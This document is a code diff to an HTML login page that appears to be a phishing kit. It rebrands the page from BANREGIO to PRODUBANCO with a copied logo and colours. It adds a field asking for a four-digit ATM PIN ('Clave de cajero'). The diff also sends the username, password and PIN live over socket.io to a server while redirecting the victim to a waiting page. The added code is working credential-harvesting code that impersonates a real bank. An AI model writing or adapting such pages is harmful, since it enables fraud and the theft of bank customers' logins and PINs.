@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>BANREGIO</title>
+  <title>PRODUBANCO</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
       text-align: center;
     }
@@ -46,18 +46,17 @@
       margin-bottom: 1rem;
     }
 
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
+      margin: 1rem 0;
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
+      justify-content: flex-start;
+      margin-left: -15px;
     }
 
     .input-group .icon {
@@ -75,11 +74,10 @@
       height: 20px;
     }
 
-    /* Botón centrado y ajustado */
     button {
-      background-color: #FF4C00;
+      background-color: #1B4D08;
       color: white;
-      padding: 8px 20px; /* Botón más pequeño */
+      padding: 8px 20px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -97,7 +95,6 @@
       cursor: not-allowed;
     }
 
-    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -111,8 +108,8 @@
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://eyenovation.mx/cdn/shop/files/Iconos_Web-10.png?v=1710200856&width=1420" alt="BANREGIO" class="logo">
-    <h2>Bienvenido a <strong>BANREGIO</strong></h2>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="PRODUBANCO" class="logo">
+    <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
     <p>Ingrese su usuario y contraseña para iniciar con su proceso financiero.</p>
     <form id="login-form">
       <div class="input-group">
@@ -123,9 +120,15 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      <!-- Nuevo campo Clave de cajero -->
+      <div class="input-group">
+        <div class="icon"><i class="fas fa-key"></i></div>
+        <input type="text" id="cajero" placeholder="Clave de cajero" maxlength="4" required>
+      </div>
       
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
+      <p id="cajeroError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -139,21 +142,18 @@
 
       if (form) {
         form.addEventListener('submit', (e) => {
-          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
+          e.preventDefault();
 
-          // Validar los campos antes de enviar los datos
-          if (validarUsuario() && validarPassword()) {
+          if (validarUsuario() && validarPassword() && validarCajero()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
+            const cajero = document.getElementById('cajero').value;
 
-            // Generar y guardar sessionId
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, cajero, sessionId });
 
-            // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
           }
         });
@@ -192,6 +192,28 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+
+    function validarCajero() {
+      const cajero = document.getElementById("cajero").value;
+      const cajeroError = document.getElementById("cajeroError");
+      const cajeroInput = document.getElementById("cajero");
+
+      const soloNumeros = /^\d{4}$/;
+
+      if (!cajero) {
+        cajeroError.textContent = "La clave de cajero es obligatoria";
+        cajeroInput.classList.add("campo-requerido");
+        return false;
+      } else if (!soloNumeros.test(cajero)) {
+        cajeroError.textContent = "Debe ingresar exactamente 4 dígitos numéricos";
+        cajeroInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        cajeroError.textContent = "";
+        cajeroInput.classList.remove("campo-requerido");
         return true;
       }
     }
